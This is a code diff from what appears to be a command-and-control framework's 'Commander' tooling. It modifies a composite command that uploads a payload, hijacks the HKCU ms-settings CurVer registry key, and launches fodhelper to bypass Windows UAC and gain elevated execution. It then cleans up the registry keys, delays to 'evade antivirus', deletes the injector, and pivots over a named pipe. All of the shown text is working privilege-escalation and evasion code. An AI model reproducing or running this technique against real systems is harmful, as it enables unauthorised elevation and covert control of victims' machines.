@@ -44,7 +44,7 @@ namespace Commander.Commands.Composite
         {
              new Option<string>(new[] { "--key", "-k" }, () => "c2s", "Name of the key to use"),
              new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
-             new Option<string>(new[] { "--pipe", "-n" }, () => "local","Name of the pipe used to pivot."),
+             new Option<string>(new[] { "--pipe", "-n" }, () => "elev8","Name of the pipe used to pivot."),
              new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
              new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows\\tasks","Name of the folder to upload the payload."),
              new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
@@ -97,25 +97,29 @@ namespace Commander.Commands.Composite
             agent.Upload(pay, path);
             agent.Delay(1);
             agent.Echo($"Altering registry Keys");
-            agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
-            agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
-            agent.Delay(1);
+            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
+            agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
+            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
+            agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
+            agent.Delay(5);
             agent.Echo($"Starting fodhelper");
             agent.Shell("fodhelper");
-            agent.Delay(2);
+            agent.Delay(5);
             agent.Echo($"Cleaning");
-            agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
-            agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
+            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
+            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
+            agent.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
+            agent.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
             if (!options.inject)
             {
-                agent.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
+                agent.Echo($"[!] Don't forget to remove executable after use! : del {path}");
             }
             else
             {
                 agent.Echo($"Waiting {options.injectDelay}s to evade antivirus");
                 agent.Delay(options.injectDelay + 10);
                 agent.Echo($"Removing injector {path}");
-                agent.Shell($"del {path}");
+                agent.DeleteFile(path);
             }
             agent.Echo($"Linking to {endpoint}");
             var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
